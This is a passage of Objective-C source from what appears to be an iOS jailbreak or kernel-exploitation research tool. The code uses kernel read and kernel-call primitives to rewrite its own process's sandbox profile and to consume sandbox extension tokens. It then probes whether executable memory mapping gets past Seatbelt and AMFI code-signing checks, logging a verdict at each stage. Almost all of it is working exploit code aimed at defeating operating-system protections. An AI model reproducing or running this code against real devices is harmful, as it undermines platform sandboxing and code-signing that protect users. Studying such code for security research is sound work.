        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL611_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_53D540_DISPATCH_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -12;
    }
    if (apply_kern_ret != 0) {
        free(token);
        NSString *fail = [NSString stringWithFormat:@"KCALL611_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.11 %@", fail]);
        dt1025_run_611_finish(log, verdictOut);
        return -13;
    }

    dt1025_stage(@"build102.6.11 KCALL611_53D540_APPLY_RETURN_0");

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL611_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_MIRROR_CHAIN_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -16;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL611_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.11 KCALL611_SLOT1_STILL_NULL");
        dt1025_run_611_finish(log, verdictOut);
        return -17;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class != 2) {
        free(token);
        if (shape_class == 1)
            dt1025_set_verdict(verdictOut, @"KCALL611_SLOT1_INVALID_SHAPE");
        else if (shape_class == 3)
            dt1025_set_verdict(verdictOut, @"KCALL611_SLOT1_AMBIGUOUS_SHAPE");
        else
            dt1025_set_verdict(verdictOut, @"KCALL611_SLOT1_SHAPE_UNKNOWN");
        dt1025_stage(@"build102.6.11 KCALL611_APPLY_MIRROR_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -18;
    }

    dt1025_stage(@"build102.6.11 KCALL611_APPLY_MIRROR_OK");

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.11 KCALL611_CONSUME_RESULT kern_ret=%d handle_out=%lld token_len=%zu configured_slot=%u profile=0x%llx",
        consume_kern_ret, (long long)handle_out, token_len, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL611_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_CONSUME_DISPATCH_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -22;
    }

    if (consume_kern_ret != 0 || handle_out <= 0) {
        if (consume_kern_ret != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL611_CONSUME_KERN_FAIL");
            dt1025_stage(@"build102.6.11 KCALL611_CONSUME_KERN_FAIL");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL611_CONSUME_HANDLE_ZERO");
            dt1025_stage(@"build102.6.11 KCALL611_CONSUME_HANDLE_ZERO");
        }
        dt1025_run_611_finish(log, verdictOut);
        return -23;
    }

    dt1025_stage(@"build102.6.11 KCALL611_EXECUTABLE_CONSUME_HANDLE_NONZERO");

    const char *mmap_path = kDT611MmapPath;
    struct stat st = { 0 };
    errno = 0;
    int stat_ret = stat(mmap_path, &st);
    int stat_errno = errno;

    if (stat_ret != 0) {
        dt1025_log(log, @"[*] build102.6.11 KCALL611_PREFLIGHT stat path=%s ret=%d errno=%d",
            mmap_path, stat_ret, stat_errno);
        dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_PREFLIGHT_OR_IO_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_MMAP_PREFLIGHT_OR_IO_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -30;
    }

    dt1025_log(log, @"[*] build102.6.11 KCALL611_PREFLIGHT stat path=%s ret=0 size=%lld",
        mmap_path, (long long)st.st_size);

    errno = 0;
    int fd = open(mmap_path, O_RDONLY);
    int open_errno = errno;
    if (fd < 0) {
        dt1025_log(log, @"[*] build102.6.11 KCALL611_PREFLIGHT open path=%s fd=%d errno=%d",
            mmap_path, fd, open_errno);
        dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_PREFLIGHT_OR_IO_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_MMAP_PREFLIGHT_OR_IO_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -31;
    }

    unsigned char magic_buf[kDT611MachMagicBytes];
    memset(magic_buf, 0, sizeof(magic_buf));
    errno = 0;
    ssize_t magic_ret = read(fd, magic_buf, kDT611MachMagicBytes);
    int magic_errno = errno;

    if (magic_ret != (ssize_t)kDT611MachMagicBytes) {
        dt1025_log(log, @"[*] build102.6.11 KCALL611_PREFLIGHT magic path=%s read_ret=%zd errno=%d",
            mmap_path, magic_ret, magic_errno);
        close(fd);
        dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_PREFLIGHT_OR_IO_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_MMAP_PREFLIGHT_OR_IO_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -32;
    }

    uint32_t mach_magic = 0;
    memcpy(&mach_magic, magic_buf, sizeof(mach_magic));
    dt1025_log(log, @"[*] build102.6.11 KCALL611_PREFLIGHT magic path=%s mach_magic=0x%08x open_fd=%d",
        mmap_path, mach_magic, fd);
    dt1025_stage(@"build102.6.11 KCALL611_MMAP_PREFLIGHT_OK");

    if (kDT611MmapProt == PROT_READ) {
        dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_OP16_NOT_TRIGGERED");
        dt1025_stage(@"build102.6.11 KCALL611_MMAP_OP16_NOT_TRIGGERED");
        close(fd);
        dt1025_run_611_finish(log, verdictOut);
        return -33;
    }

    dt1025_stage(@"build102.6.11 KCALL611_MMAP_BEGIN");
    dt1025_log(log, @"[*] build102.6.11 KCALL611_MMAP_CALL path=%s prot=%d flags=MAP_PRIVATE(%d) fd=%d op16_expected=YES",
        mmap_path, kDT611MmapProt, kDT611MmapFlags, fd);

    errno = 0;
    void *map_addr = mmap(NULL, kDT611MmapPageSize, kDT611MmapProt, kDT611MmapFlags, fd, 0);
    int mmap_errno = errno;

    if (map_addr == MAP_FAILED) {
        dt1025_log(log, @"[*] build102.6.11 KCALL611_MMAP_RESULT addr=MAP_FAILED errno=%d prot=%d flags=%d path=%s fd=%d",
            mmap_errno, kDT611MmapProt, kDT611MmapFlags, mmap_path, fd);
        if (mmap_errno == EACCES) {
            dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_OP16_SANDBOX_DENY");
            dt1025_stage(@"build102.6.11 KCALL611_MMAP_OP16_SANDBOX_DENY");
        } else if (mmap_errno == EPERM) {
            dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_AMFI_OR_NON_SANDBOX_EPERM");
            dt1025_stage(@"build102.6.11 KCALL611_MMAP_AMFI_OR_NON_SANDBOX_EPERM");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_FAIL");
            dt1025_stage(@"build102.6.11 KCALL611_MMAP_FAIL");
        }
        close(fd);
        dt1025_run_611_finish(log, verdictOut);
        dt1025_log(log, @"[*] build102.6.11 verdict=%@ order=issue_exec_apply_mirror_consume_mmap_fail dash=NO helper=NO loader_lanes=NO",
            verdictOut ? *verdictOut : @"?");
        return 0;
    }

    dt1025_log(log, @"[*] build102.6.11 KCALL611_MMAP_RESULT addr=%p errno=0 prot=%d flags=%d path=%s fd=%d",
        map_addr, kDT611MmapProt, kDT611MmapFlags, mmap_path, fd);

    char probe_buf[kDT611MmapProbeBytes];
    memset(probe_buf, 0, sizeof(probe_buf));
    memcpy(probe_buf, map_addr, kDT611MmapProbeBytes);
    (void)probe_buf;

    errno = 0;
    int munmap_ret = munmap(map_addr, kDT611MmapPageSize);
    int munmap_errno = errno;
    errno = 0;
    int close_ret = close(fd);
    int close_errno = errno;

    dt1025_log(log, @"[*] build102.6.11 KCALL611_MMAP_TEARDOWN munmap_ret=%d munmap_errno=%d close_ret=%d close_errno=%d copied_bytes=%zu",
        munmap_ret, munmap_errno, close_ret, close_errno, kDT611MmapProbeBytes);

    dt1025_set_verdict(verdictOut, @"KCALL611_MMAP_OP16_EFFECT_OK");
    dt1025_stage(@"build102.6.11 KCALL611_MMAP_OP16_EFFECT_OK");
    dt1025_run_611_finish(log, verdictOut);
    dt1025_log(log, @"[*] build102.6.11 verdict=%@ order=issue_exec_apply_mirror_consume_preflight_mmap dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static const char *dt1025_resolve_self_executable_path(char *buf, size_t buf_len,
    void (^log)(NSString *line))
{
    if (!buf || buf_len == 0)
        return NULL;

    buf[0] = '\0';

    @autoreleasepool {
        NSString *exePath = [[NSBundle mainBundle] executablePath];
        if (exePath.length > 0) {
            const char *utf8 = exePath.UTF8String;
            if (utf8 && utf8[0] != '\0') {
                strlcpy(buf, utf8, buf_len);
                dt1025_log(log, @"[*] build102.6.16 KCALL616_SELF_EXE_PATH source=NSBundle.mainBundle.executablePath");
                return buf;
            }
        }
    }

    uint32_t size = (uint32_t)buf_len;
    if (_NSGetExecutablePath(buf, &size) == 0 && buf[0] != '\0') {
        dt1025_log(log, @"[*] build102.6.16 KCALL616_SELF_EXE_PATH source=_NSGetExecutablePath");
        return buf;
    }

    dt1025_log(log, @"[!] build102.6.16 KCALL616_SELF_EXE_PATH resolve failed");
    return NULL;
}

static void dt1025_run_613_finish(void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    (void)log;
    (void)verdictOut;
    dt1025_stage(@"build102.6.13 KCALL613_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.13 KCALL613_DEVICE_RUN_COMPLETE");
}

static int dt1025_run_613_amfi_signed_macho_mmap_isolation(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.13 KCALL613_AMFI_SIGNED_MACHO_MMAP_ISOLATION begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.13 KCALL613_AMFI_SIGNED_MACHO_MMAP_ISOLATION");
    dt1025_stage(@"build102.6.13 KCALL613_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL613_SELF_TARGET_FAIL");
        dt1025_run_613_finish(log, verdictOut);
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL613_SELF_TARGET_FAIL");
        dt1025_run_613_finish(log, verdictOut);
        return -11;
    }

    char exe_path_buf[PATH_MAX];
    const char *exe_path = dt1025_resolve_self_executable_path(exe_path_buf, sizeof(exe_path_buf), log);
    if (!exe_path) {
        dt1025_set_verdict(verdictOut, @"KCALL613_SELF_EXE_PATH_FAIL");
        dt1025_stage(@"build102.6.13 KCALL613_SELF_EXE_PATH_FAIL");
        dt1025_run_613_finish(log, verdictOut);
        return -20;
    }

    size_t exe_path_len = strlen(exe_path);
    dt1025_log(log, @"[*] build102.6.13 KCALL613_SELF_EXE_PATH path=%s path_len=%zu",
        exe_path, exe_path_len);
    dt1025_stage(@"build102.6.13 KCALL613_SELF_EXE_PATH");

    struct stat st = { 0 };
    errno = 0;
    int stat_ret = stat(exe_path, &st);
    int stat_errno = errno;

    dt1025_log(log, @"[*] build102.6.13 KCALL613_SELF_EXE_STAT path=%s ret=%d size=%lld errno=%d",
        exe_path, stat_ret, (long long)st.st_size, stat_errno);

    if (stat_ret != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL613_SELF_EXE_PREFLIGHT_FAIL");
        dt1025_stage(@"build102.6.13 KCALL613_SELF_EXE_PREFLIGHT_FAIL");
        dt1025_run_613_finish(log, verdictOut);
        return -30;
    }

    errno = 0;
    int fd = open(exe_path, O_RDONLY);
    int open_errno = errno;

    dt1025_log(log, @"[*] build102.6.13 KCALL613_SELF_EXE_OPEN path=%s fd=%d errno=%d",
        exe_path, fd, open_errno);

    if (fd < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL613_SELF_EXE_PREFLIGHT_FAIL");
        dt1025_stage(@"build102.6.13 KCALL613_SELF_EXE_PREFLIGHT_FAIL");
        dt1025_run_613_finish(log, verdictOut);
        return -31;
    }

    unsigned char magic_buf[kDT613MachMagicBytes];
    memset(magic_buf, 0, sizeof(magic_buf));
    errno = 0;
    ssize_t magic_ret = read(fd, magic_buf, kDT613MachMagicBytes);
    int magic_errno = errno;

    if (magic_ret != (ssize_t)kDT613MachMagicBytes) {
        dt1025_log(log, @"[*] build102.6.13 KCALL613_SELF_EXE_MAGIC read_ret=%zd errno=%d",
            magic_ret, magic_errno);
        close(fd);
        dt1025_set_verdict(verdictOut, @"KCALL613_SELF_EXE_PREFLIGHT_FAIL");
        dt1025_stage(@"build102.6.13 KCALL613_SELF_EXE_PREFLIGHT_FAIL");
        dt1025_run_613_finish(log, verdictOut);
        return -32;
    }

    uint32_t mach_magic = 0;
    memcpy(&mach_magic, magic_buf, sizeof(mach_magic));
    dt1025_log(log, @"[*] build102.6.13 KCALL613_SELF_EXE_MAGIC mach_magic=0x%08x fd=%d",
        mach_magic, fd);
    dt1025_stage(@"build102.6.13 KCALL613_SELF_EXE_PREFLIGHT_OK");

    if (kDT613MmapProt != (PROT_READ | PROT_EXEC)) {
        dt1025_set_verdict(verdictOut, @"KCALL613_MMAP_PROT_MISMATCH");
        dt1025_stage(@"build102.6.13 KCALL613_MMAP_PROT_MISMATCH");
        close(fd);
        dt1025_run_613_finish(log, verdictOut);
        return -33;
    }

    dt1025_stage(@"build102.6.13 KCALL613_MMAP_BEGIN");
    dt1025_log(log, @"[*] build102.6.13 KCALL613_MMAP_CALL path=%s prot=5 flags=MAP_PRIVATE(%d) fd=%d",
        exe_path, kDT613MmapFlags, fd);

    errno = 0;
    void *map_addr = mmap(NULL, kDT613MmapPageSize, kDT613MmapProt, kDT613MmapFlags, fd, 0);
    int mmap_errno = errno;

    if (map_addr == MAP_FAILED) {
        dt1025_log(log, @"[*] build102.6.13 KCALL613_MMAP_RESULT addr=MAP_FAILED errno=%d prot=5 flags=%d path=%s fd=%d",
            mmap_errno, kDT613MmapFlags, exe_path, fd);
        dt1025_log(log, @"[*] build102.6.13 KCALL613_POC_CORRELATE grep pid=%d: Library Validation failed | file-map-executable",
            (int)upid);

        if (mmap_errno == EPERM) {
            dt1025_set_verdict(verdictOut, @"KCALL613_AMFI_PASS_SEATBELT_DENY");
            dt1025_stage(@"build102.6.13 KCALL613_AMFI_PASS_SEATBELT_DENY");
            dt1025_log(log, @"[*] build102.6.13 expected Branch A: AMFI pass + Seatbelt deny (confirm in poc: no LV line, yes file-map-executable)");
        } else if (mmap_errno == EACCES) {
            dt1025_set_verdict(verdictOut, @"KCALL613_AMFI_ISOLATION_INCONCLUSIVE");
            dt1025_stage(@"build102.6.13 KCALL613_AMFI_ISOLATION_INCONCLUSIVE");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL613_AMFI_ISOLATION_INCONCLUSIVE");
            dt1025_stage(@"build102.6.13 KCALL613_AMFI_ISOLATION_INCONCLUSIVE");
        }

        close(fd);
        dt1025_run_613_finish(log, verdictOut);
        dt1025_log(log, @"[*] build102.6.13 verdict=%@ order=self_exe_stat_open_magic_mmap_fail no_consume=YES jbroot=NO dash=NO helper=NO loader_lanes=NO",
            verdictOut ? *verdictOut : @"?");
        return 0;
    }

    dt1025_log(log, @"[*] build102.6.13 KCALL613_MMAP_RESULT addr=%p errno=0 prot=5 flags=%d path=%s fd=%d",
        map_addr, kDT613MmapFlags, exe_path, fd);

    char probe_buf[kDT613MmapProbeBytes];
    memset(probe_buf, 0, sizeof(probe_buf));
    memcpy(probe_buf, map_addr, kDT613MmapProbeBytes);
    (void)probe_buf;

    errno = 0;
    int munmap_ret = munmap(map_addr, kDT613MmapPageSize);
    int munmap_errno = errno;
    errno = 0;
    int close_ret = close(fd);
    int close_errno = errno;

    dt1025_log(log, @"[*] build102.6.13 KCALL613_MMAP_TEARDOWN munmap_ret=%d munmap_errno=%d close_ret=%d close_errno=%d copied_bytes=%zu",
        munmap_ret, munmap_errno, close_ret, close_errno, kDT613MmapProbeBytes);

    dt1025_set_verdict(verdictOut, @"KCALL613_BOTH_PASS");
    dt1025_stage(@"build102.6.13 KCALL613_BOTH_PASS");
    dt1025_log(log, @"[*] build102.6.13 KCALL613_POC_CORRELATE grep pid=%d: expect no Library Validation failed and no file-map-executable deny",
        (int)upid);
    dt1025_run_613_finish(log, verdictOut);
    dt1025_log(log, @"[*] build102.6.13 verdict=%@ order=self_exe_stat_open_magic_mmap_ok no_consume=YES jbroot=NO dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static int dt1025_sandbox_check_op16(const char *path, int *errno_out, void (^log)(NSString *line))
{
    if (!path || !path[0]) {
        if (errno_out)
            *errno_out = EINVAL;
        return -1;
    }

    void *lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
    if (!lib) {
        dt1025_log(log, @"[!] build102.6.16 dlopen libsystem_sandbox: %s", dlerror() ?: "?");
        if (errno_out)
            *errno_out = errno;
        return -1;
    }

    typedef int (*sandbox_check_fn)(pid_t, const char *, int, ...);
    sandbox_check_fn check = (sandbox_check_fn)dlsym(lib, "sandbox_check");
    if (!check) {
        dt1025_log(log, @"[!] build102.6.16 dlsym sandbox_check failed");
        if (errno_out)
            *errno_out = errno;
        dlclose(lib);
        return -1;
    }

    errno = 0;
    int ret = check(getpid(), kDT614SandboxOp, kDT614SandboxCheckFlags, path);
    int check_errno = errno;
    dlclose(lib);

    if (errno_out)
        *errno_out = check_errno;
    return ret;
}

static void dt1025_run_614_finish(void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    (void)log;
    (void)verdictOut;
    dt1025_stage(@"build102.6.14 KCALL614_NO_MMAP_NO_AMFI_LANE");
    dt1025_stage(@"build102.6.14 KCALL614_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.14 KCALL614_DEVICE_RUN_COMPLETE");
}

static int dt1025_run_614_seatbelt_op16_sandbox_check_isolation(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();
    const char *target_path = kDT614TargetPath;

    dt1025_log(log, @"[*] build102.6.14 KCALL614_SEATBELT_OP16_SANDBOX_CHECK_ISOLATION begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_OP16_SANDBOX_CHECK_ISOLATION");
    dt1025_stage(@"build102.6.14 KCALL614_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL614_SELF_TARGET_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL614_SELF_TARGET_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -11;
    }

    struct stat st = { 0 };
    errno = 0;
    int stat_ret = stat(target_path, &st);
    int stat_errno = errno;

    if (stat_ret != 0) {
        dt1025_log(log, @"[*] build102.6.14 KCALL614_PREFLIGHT stat path=%s ret=%d errno=%d",
            target_path, stat_ret, stat_errno);
        dt1025_set_verdict(verdictOut, @"KCALL614_TARGET_PATH_MISSING");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -20;
    }

    dt1025_log(log, @"[*] build102.6.14 KCALL614_PREFLIGHT stat path=%s ret=0 size=%lld errno=0",
        target_path, (long long)st.st_size);

    errno = 0;
    int fd = open(target_path, O_RDONLY);
    int open_errno = errno;
    if (fd < 0) {
        dt1025_log(log, @"[*] build102.6.14 KCALL614_PREFLIGHT open path=%s fd=%d errno=%d",
            target_path, fd, open_errno);
        dt1025_set_verdict(verdictOut, @"KCALL614_TARGET_PATH_MISSING");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -21;
    }

    unsigned char magic_buf[kDT614MachMagicBytes];
    memset(magic_buf, 0, sizeof(magic_buf));
    errno = 0;
    ssize_t magic_ret = read(fd, magic_buf, kDT614MachMagicBytes);
    int magic_errno = errno;
    close(fd);

    if (magic_ret != (ssize_t)kDT614MachMagicBytes) {
        dt1025_log(log, @"[*] build102.6.14 KCALL614_PREFLIGHT magic path=%s read_ret=%zd errno=%d",
            target_path, magic_ret, magic_errno);
        dt1025_set_verdict(verdictOut, @"KCALL614_TARGET_PREFLIGHT_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -22;
    }

    uint32_t mach_magic = 0;
    memcpy(&mach_magic, magic_buf, sizeof(mach_magic));
    dt1025_log(log, @"[*] build102.6.14 KCALL614_PREFLIGHT magic path=%s mach_magic=0x%08x size=%lld",
        target_path, mach_magic, (long long)st.st_size);
    dt1025_stage(@"build102.6.14 KCALL614_TARGET_PREFLIGHT_OK");

    dt1025_stage(@"build102.6.14 KCALL614_BASELINE_SANDBOX_CHECK_BEGIN");
    dt1025_log(log, @"[*] build102.6.14 KCALL614_BASELINE_SANDBOX_CHECK op=%s flags=0x%x path=%s",
        kDT614SandboxOp, kDT614SandboxCheckFlags, target_path);

    int baseline_errno = 0;
    int baseline_ret = dt1025_sandbox_check_op16(target_path, &baseline_errno, log);
    dt1025_log(log, @"[*] build102.6.14 KCALL614_BASELINE_SANDBOX_CHECK_RESULT ret=%d errno=%d",
        baseline_ret, baseline_errno);

    if (baseline_ret < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL614_SANDBOX_CHECK_BAD_ARGS");
        dt1025_stage(@"build102.6.14 KCALL614_SANDBOX_CHECK_BAD_ARGS");
        dt1025_run_614_finish(log, verdictOut);
        return -30;
    }

    BOOL baseline_allow = (baseline_ret == 0);
    if (baseline_allow) {
        dt1025_stage(@"build102.6.14 KCALL614_BASELINE_SANDBOX_CHECK_ALLOW");
    } else {
        dt1025_stage(@"build102.6.14 KCALL614_BASELINE_SANDBOX_CHECK_DENY");
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));

    dt1025_compare_target_t self_pre = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_pre_issue", configured_slot, &self_pre, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL614_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -14;
    }

    if (self_pre.configured_raw != (uint64_t)-1LL) {
        dt1025_log(log, @"[!] build102.6.14 pre-issue slot1 raw=0x%llx expected=-1",
            (unsigned long long)self_pre.configured_raw);
        dt1025_set_verdict(verdictOut, @"KCALL614_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -15;
    }

    dt1025_log(log, @"[*] build102.6.14 pre-issue NULL-profile confirmed configured_slot=%u slot1_raw=0xffffffffffffffff",
        (unsigned)configured_slot);

    char *token = dt1025_issue_token(kDTClassExec, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL614_EXECUTABLE_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -40;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.14 issue OK class=%s path=%s flags=0 token_len=%zu",
        kDTClassExec, kDTJbPath, token_len);
    dt1025_stage(@"build102.6.14 KCALL614_EXECUTABLE_ISSUE_WHILE_NULL_OK");

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL614_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -12;
    }
    if (apply_kern_ret != 0) {
        free(token);
        NSString *fail = [NSString stringWithFormat:@"KCALL614_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -13;
    }

    dt1025_stage(@"build102.6.14 KCALL614_53D540_APPLY_RETURN_0");

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL614_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -16;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL614_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -17;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class != 2) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL614_APPLY_MIRROR_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -18;
    }

    dt1025_stage(@"build102.6.14 KCALL614_APPLY_MIRROR_OK");

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.14 KCALL614_CONSUME_RESULT kern_ret=%d handle_out=%lld token_len=%zu configured_slot=%u profile=0x%llx",
        consume_kern_ret, (long long)handle_out, token_len, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL614_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -22;
    }

    if (consume_kern_ret != 0 || handle_out <= 0) {
        if (consume_kern_ret != 0)
            dt1025_set_verdict(verdictOut, @"KCALL614_CONSUME_KERN_FAIL");
        else
            dt1025_set_verdict(verdictOut, @"KCALL614_CONSUME_HANDLE_ZERO");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_run_614_finish(log, verdictOut);
        return -23;
    }

    dt1025_stage(@"build102.6.14 KCALL614_CONSUME_HANDLE_NONZERO");

    dt1025_stage(@"build102.6.14 KCALL614_POST_CONSUME_SANDBOX_CHECK_BEGIN");
    dt1025_log(log, @"[*] build102.6.14 KCALL614_POST_CONSUME_SANDBOX_CHECK op=%s flags=0x%x path=%s",
        kDT614SandboxOp, kDT614SandboxCheckFlags, target_path);

    int post_errno = 0;
    int post_ret = dt1025_sandbox_check_op16(target_path, &post_errno, log);
    dt1025_log(log, @"[*] build102.6.14 KCALL614_POST_CONSUME_SANDBOX_CHECK_RESULT ret=%d errno=%d baseline_ret=%d",
        post_ret, post_errno, baseline_ret);

    if (post_ret < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL614_SANDBOX_CHECK_BAD_ARGS");
        dt1025_stage(@"build102.6.14 KCALL614_SANDBOX_CHECK_BAD_ARGS");
        dt1025_run_614_finish(log, verdictOut);
        return -31;
    }

    BOOL post_allow = (post_ret == 0);
    if (post_allow) {
        dt1025_stage(@"build102.6.14 KCALL614_POST_CONSUME_SANDBOX_CHECK_ALLOW");
    } else {
        dt1025_stage(@"build102.6.14 KCALL614_POST_CONSUME_SANDBOX_CHECK_DENY");
    }

    if (!baseline_allow && post_allow) {
        dt1025_set_verdict(verdictOut, @"KCALL614_SANDBOX_CHECK_CHANGED_ALLOW");
